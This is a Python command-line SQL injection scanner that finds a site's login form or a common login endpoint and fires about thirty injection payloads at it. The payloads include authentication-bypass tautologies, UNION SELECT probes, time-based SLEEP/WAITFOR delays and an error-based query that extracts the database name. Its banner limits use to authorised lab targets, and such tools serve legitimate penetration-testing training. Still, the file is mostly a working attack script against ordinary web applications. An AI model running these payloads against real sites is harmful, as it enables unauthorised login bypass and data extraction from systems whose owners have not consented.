from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.progress import Progress
from rich.text import Text
from rich.prompt import Prompt
from urllib.parse import urlparse
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import time
import json

# Initialize rich console
console = Console()

# SQL payloads to test
sql_payloads = [
    "23 OR 1=1",
    "0 or 1=1",
    "' or 0=0 --",
    '" or 0=0 --',
    "or 0=0 --",
    "' OR '1'='1",
    "' OR '1'='2",
    '" OR "1"="1',
    '" OR "1"="2',
    "' OR 1=1 --",
    "admin' --",
    "' OR 1=2 --",
    "' OR SLEEP(5) --",
    "' OR (SELECT 1 FROM (SELECT(SLEEP(5)))a) --",
    "') OR SLEEP(5) --",
    "'; WAITFOR DELAY '0:0:5'--",
    "'); WAITFOR DELAY '0:0:5'--",
    "admin' AND 1=1 --",
    "admin' AND 1=2 --",
    "' UNION SELECT NULL,NULL,NULL --",
    "' UNION SELECT 'admin','password' --",
    "admin' #",
    "' OR 'a'='a",
    "' OR 1=1 LIMIT 1 --",
    "')) OR 1=1 --",
    "' OR '1'='1' /*",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1' ORDER BY 3--",
    "1' GROUP BY 1,2--",
    "' OR 1=1-",
    "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,DATABASE(),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",
]

# Static password (not used to check for success)
static_password = "test123"

# Common login endpoints to try if form parsing fails
common_login_endpoints = [
    "/rest/user/login",  # Juice Shop
    "/api/login",
    "/auth",
    "/login",
    "/api/v1/login",
    "/api/auth",
    "/user/login",
    "/signin",
]

# Headers for API requests
headers = {"Accept": "application/json", "Content-Type": "application/json"}


# Function to test SQL injection on a given URL (form or endpoint)
def test_sql_injection(
    target_url, method="post", form_data_template=None, is_form=True, cookies=None
):
    vulnerabilities = []
    with Progress(console=console) as progress:
        task = progress.add_task(
            "[bright_green]Testing SQL payloads...[/bright_green]",
            total=len(sql_payloads),
        )
        true_response, true_response_json, false_response, false_response_json = (
            None,
            None,
            None,
            None,
        )

        for payload in sql_payloads:
            console.print(f"[bright_cyan][*] Trying payload: {payload}[/bright_cyan]")

            # Prepare form data
            form_data = (
                form_data_template.copy()
                if form_data_template
                else {"email": payload, "password": static_password}
            )
            if is_form and form_data_template:
                for key in form_data:
                    if key != "password" and form_data[key] != static_password:
                        form_data[key] = payload

            # Measure response time for time-based payloads
            start_time = time.time()
            try:
                if method.lower() == "post":
                    res = requests.post(
                        target_url,
                        json=form_data if not is_form else None,
                        data=form_data if is_form else None,
                        headers=headers if not is_form else None,
                        allow_redirects=False,
                        cookies=cookies,
                        timeout=10,
                    )
                else:
                    res = requests.get(
                        target_url,
                        params=form_data,
                        allow_redirects=False,
                        cookies=cookies,
                        timeout=10,
                    )
            except requests.RequestException as e:
                console.print(
                    f"[bright_red][-] Error sending request to {target_url}: {e}[/bright_red]"
                )
                progress.update(task, advance=1)
                time.sleep(0.1)
                continue
            response_time = time.time() - start_time

            # Try to parse response as JSON for API-based sites
            response_json = {}
            try:
                response_json = res.json()
            except ValueError:
                pass  # Suppress "Response is not JSON" output

            # Check if the redirect is back to a login page (only for 300-399 status codes)
            is_login_redirect = False
            redirect_location = res.headers.get("Location", "")
            if 300 <= res.status_code <= 399:
                is_login_redirect = redirect_location.endswith(
                    ("login", "login.html", "login.jsp", "signin")
                )

            # Boolean logic setup
            if payload in ["' OR '1'='1", '" OR "1"="1', "' OR 1=1 --"]:
                true_response, true_response_json = res, response_json
            elif payload in ["' OR '1'='2", '" OR "1"="2', "' OR 1=2 --"]:
                false_response, false_response_json = res, response_json

            if (
                "'1'='1" in payload
                and false_response is not None
                and (
                    true_response.status_code != false_response.status_code
                    or true_response_json != false_response_json
                )
                and not is_login_redirect
            ):
                vulnerabilities.append(
                    {
                        "type": "SQL Injection (Boolean-Based)",
                        "payload": payload,
                        "status_code": res.status_code,
                        "url": target_url,
                        "severity": "Medium",
                    }
                )
                console.print(
                    f"[bold bright_red][!!!] Boolean-Based SQLi suspected (Payload: {payload})[/bold bright_red]"
                )

            if res.status_code in [301, 302, 303] and not is_login_redirect:
                vulnerabilities.append(
                    {
                        "type": "SQL Injection (Redirect-Based)",
                        "payload": payload,
                        "status_code": res.status_code,
                        "url": target_url,
                        "severity": "High",
                    }
                )
                console.print(
                    f"[bold bright_red][!!!] Redirect-Based SQLi detected (Payload: {payload})[/bold bright_red]"
                )

            success_keywords = [
                "Welcome",
                "dashboard",
                "user",
                "success",
                "authentication",
                "token",
            ]
            response_text = (
                json.dumps(response_json).lower() if response_json else res.text.lower()
            )
            is_success = any(
                keyword.lower() in response_text for keyword in success_keywords
            )

            if is_success and not is_login_redirect:
                vulnerabilities.append(
                    {
                        "type": "SQL Injection (Keyword-Based)",
                        "payload": payload,
                        "status_code": res.status_code,
                        "url": target_url,
                        "severity": "High",
                    }
                )
                console.print(
                    f"[bold bright_red][!!!] Keyword-Based SQLi detected (Payload: {payload})[/bold bright_red]"
                )

            if "SLEEP" in payload:
                if response_time > 5 and not is_login_redirect:
                    vulnerabilities.append(
                        {
                            "type": "SQL Injection (Time-Based)",
                            "payload": payload,
                            "status_code": res.status_code,
                            "url": target_url,
                            "severity": "High",
                            "response_time": f"{response_time:.2f}s",
                        }
                    )
                    console.print(
                        f"[bold bright_red][!!!] Time-Based SQLi suspected (delay: {response_time:.2f}s)[/bold bright_red]"
                    )
                else:
                    console.print(f"[bright_yellow][✗] Login attempt denied[/bright_yellow]")
            elif is_login_redirect:
                console.print(f"[bright_yellow][✗] Login attempt denied[/bright_yellow]")

            progress.update(task, advance=1)
            time.sleep(0.1)
    return vulnerabilities


def display_vulnerabilities(vulnerabilities, method, url):
    if vulnerabilities:
        console.print(
            Panel(
                f"[bold bright_red]SQL Injection Vulnerabilities Found ({method})[/bold bright_red]",
                border_style="bright_red",
            )
        )
        table = Table(show_header=True, header_style="bold magenta")
        table.add_column("Type", style="bright_cyan", width=25)
        table.add_column("Payload", style="bright_green")
        table.add_column("Status Code", style="bright_blue")
        table.add_column("Severity", style="bright_red")
        table.add_column("URL", style="bright_cyan")

        for vul in vulnerabilities:
            details = vul.get("response_time", "N/A")
            severity_style = (
                "bright_red" if vul["severity"] == "High" else "orange_red1"
            )
            table.add_row(
                vul["type"],
                vul["payload"],
                str(vul["status_code"]),
                Text(vul["severity"], style=severity_style),
                vul["url"],
            )
        console.print(table)
    else:
        console.print(
            Panel(
                f"[bold bright_green]No SQL Injection vulnerabilities detected for {method} request at {url}[/bold bright_green]",
                border_style="bright_green",
            )
        )


def is_valid_url(url):
    parsed = urlparse(url)
    return all([parsed.scheme in ("http", "https"), parsed.netloc])


def main():
    welcome_text = r"""
[bold bright_white]
  _____  ____  _      _                                       
 / ____|/ __ \| |    (_)                                      
| (___ | |  | | |     _    ___  ___ __ _ _ __  _ __   ___ _ __ 
 \___ \| |  | | |    | |  / __|/ __/ _` | '_ \| '_ \ / _ \ '__|
 ____) | |__| | |____| |  \__ \ (_| (_| | | | | | | |  __/ |   
|_____/ \____\|______|_|  |___/\___\__,_|_| |_|_| |_|___|_|   

[/bold bright_white]
[bold bright_green]Welcome to SQL Injection Scanner[/bold bright_green]

[bright_yellow]This tool is intended for educational and authorized security testing only.[/bright_yellow]
[bright_red]⚠️  Do NOT use this tool against live or unauthorized websites.[/bright_red]
[bright_blue]✔ Always test in legal, controlled environments (e.g., DVWA, Juice Shop, TestFire).[/bright_blue]
"""

    console.print(
        Panel.fit(
            welcome_text,  # Use the raw string as the first positional argument
            title="[bold bright_magenta]🛡 SQLi Detection - Ethical Hacking Toolkit 🛡[/bold bright_magenta]",
            border_style="bright_cyan",
        )
    )

    # console.print(
    #     Panel(
    #         f"[bold bright_cyan]SQL Injection Scanner - Enhanced CLI[/bold bright_cyan]",
    #         title="[bold magenta]Security Tools[/bold magenta]",
    #         border_style="bright_blue",
    #     )
    # )

    url = Prompt.ask(
        "[bold green]Enter the target URL (e.g., http://www.example.com)[/bold green]"
    ).strip()

    if not is_valid_url(url):
        console.print(
            "[bold red][-] Please provide a valid URL (must include http:// or https://).[/bold red]"
        )
        return

    console.print(
        Panel(
            f"[bold bright_cyan]Target URL: {url}[/bold bright_cyan]",
            title="[bold magenta]Starting Scan[/bold magenta]",
            border_style="bright_blue",
        )
    )

    try:
        with Progress(console=console) as progress:
            task = progress.add_task(
                "[bright_green]Fetching initial page...[/bright_green]", total=1
            )
            response = requests.get(url, timeout=5)
            progress.update(task, advance=1)
        if response.status_code != 200:
            console.print(
                f"[bright_red][-] Failed to access {url}. Status code: {response.status_code}[/bright_red]"
            )
            return
    except requests.RequestException as e:
        console.print(f"[bright_red][-] Error accessing {url}: {e}[/bright_red]")
        return

    soup = BeautifulSoup(response.text, "html.parser")
    forms = soup.find_all("form")
    login_form = None

    for form in forms:
        inputs = form.find_all("input")
        has_username = any(
            inp.get("name") in ["username", "login", "user", "email"] for inp in inputs
        )
        has_password = any(inp.get("type") == "password" for inp in inputs)
        action = form.get("action", "").lower()
        if has_username and has_password or "login" in action:
            login_form = form
            break

    if login_form:
        action = login_form.get("action")
        method = login_form.get("method", "get").lower()
        full_action_url = urljoin(url, action)

        console.print(
            Panel(
                f"[bold bright_cyan]Method: {method.upper()}\nAction: {full_action_url}[/bold bright_cyan]",
                title="[bold magenta]Login Form Found[/bold magenta]",
                border_style="bright_blue",
            )
        )

        form_data = {}
        inputs = login_form.find_all("input")
        for inp in inputs:
            name = inp.get("name")
            if not name:
                continue
            input_type = inp.get("type", "text")
            if input_type == "password":
                form_data[name] = static_password
            elif input_type == "submit":
                form_data[name] = inp.get("value", "Submit")
            else:
                form_data[name] = "placeholder"

        vulnerabilities = test_sql_injection(
            full_action_url,
            method=method,
            form_data_template=form_data,
            is_form=True,
            cookies=response.cookies,
        )
        display_vulnerabilities(vulnerabilities, method.upper(), full_action_url)
    else:
        console.print(
            "[bright_yellow][⚠️] No login form found! Falling back to testing common login endpoints.[/bright_yellow]"
        )
        valid_endpoint_found = False
        for endpoint in common_login_endpoints:
            full_login_url = urljoin(url, endpoint)
            console.print(
                Panel(
                    f"[bold bright_cyan]Testing Login Endpoint: {full_login_url}\nMethod: POST[/bold bright_cyan]",
                    title="[bold magenta]Testing Endpoint[/bold magenta]",
                    border_style="bright_blue",
                )
            )

            try:
                with Progress(console=console) as progress:
                    task = progress.add_task(
                        "[bright_green]Testing endpoint accessibility...[/bright_green]",
                        total=1,
                    )
                    test_response = requests.post(
                        full_login_url,
                        json={"email": "test@example.com", "password": static_password},
                        headers=headers,
                        allow_redirects=False,
                        cookies=response.cookies,
                        timeout=5,
                    )
                    progress.update(task, advance=1)
                if test_response.status_code in [200, 201, 400, 401, 403]:
                    valid_endpoint_found = True
                    vulnerabilities = test_sql_injection(
                        full_login_url,
                        method="post",
                        form_data_template=None,
                        is_form=False,
                        cookies=response.cookies,
                    )
                    display_vulnerabilities(vulnerabilities, "POST", full_login_url)
                    break
            except requests.RequestException:
                console.print(
                    f"[bright_red][-] Endpoint {full_login_url} is not accessible.[/bright_red]"
                )
                continue

        if not valid_endpoint_found:
            console.print(
                Panel(
                    "[bold bright_red]No valid login endpoint found. Please inspect the site manually to identify the login endpoint.[/bold bright_red]",
                    border_style="bright_red",
                )
            )


if __name__ == "__main__":
    main()


def run_sql_injection_scanner():
    """Main entry point to run the SQLi scanner (for module use)."""
    main()  # just call your existing main() function


# Only runs when executed directly (for standalone testing)
if __name__ == "__main__":
    run_sql_injection_scanner()